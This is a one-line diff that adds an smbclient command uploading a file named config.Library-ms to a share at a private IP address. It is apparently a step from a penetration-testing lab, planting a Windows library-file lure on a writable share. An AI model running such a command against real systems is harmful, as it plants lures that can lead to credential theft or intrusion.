@@ -1,0 +1,1 @@
+smbclient //192.168.236.195/share -c 'put config.Library-ms'
